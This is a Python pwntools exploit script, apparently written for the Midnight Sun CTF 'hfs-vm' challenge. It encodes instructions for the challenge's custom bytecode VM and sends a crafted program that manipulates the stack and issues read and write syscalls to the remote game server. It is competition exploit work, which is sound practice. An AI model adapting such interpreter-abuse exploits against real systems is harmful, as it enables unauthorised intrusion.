from pwn import *

# 0x0: fd to child (stdin)
# 0x4: fd to child (stdout)
# ========================
# 16' 16-bit registers
# ========================
# stack
#

p = remote("hfs-vm-01.play.midnightsunctf.se",4096)

def mov_reg(reg1, reg2):
    op = 0
    op |= (reg1 << 5)
    op |= (reg2 << 9)
    op &= ~(0x2000)
    return p32(op)

def mov(reg, val):
    op = 0
    op |= (reg << 5)
    op |= (val << 0x10)
    op |= (0x2000)
    return p32(op)

def add(reg, val):
    op = u32(mov(reg, val))
    op |= 1
    return p32(op)

def add_reg(reg1, reg2):
    op = u32(mov_reg(reg1, reg2))
    op |= 1
    return p32(op)

def sub(reg, val):
    op = u32(mov(reg, val))
    op |= 2
    return p32(op)

def sub_reg(reg1, reg2):
    op = u32(mov_reg(reg1, reg2))
    op |= 2
    return p32(op)

def swap(reg1, reg2):
    op = u32(mov_reg(reg1, reg2))
    op |= 3
    return p32(op)

def xor(reg, val):
    op = u32(mov(reg, val))
    op |= 4
    return p32(op)

def xor_reg(reg1, reg2):
    op = u32(mov_reg(reg1, reg2))
    op |= 4
    return p32(op)

def stack_push(val):
    op = 0x5
    op |= (val << 0x10)
    op |= (0x2000)
    return p32(op)

def stack_push_reg(reg):
    op = 0x5
    op |= (reg << 5)
    op &= ~(0x2000)
    return p32(op)

def stack_pop_reg(reg):
    op = 0x6
    op |= (reg << 5)
    op &= ~(0x2000)
    return p32(op)

def syscall():
    op = 0
    op |= 0x9
    return p32(op)   

def ir():
    return "\x0a"+"\x00"*3

bytecode = ""
bytecode += mov(1, 0x3)
#prep. stack ptr for read
bytecode += stack_push(0x4141) * 32
bytecode += syscall()
#write
bytecode += mov(1, 0x1)
bytecode += syscall()

bytecode += ir()

program_size = len(bytecode)
assert(program_size & 3 == 0)

p.sendline(str(program_size))
p.sendline(bytecode)
p.interactive()
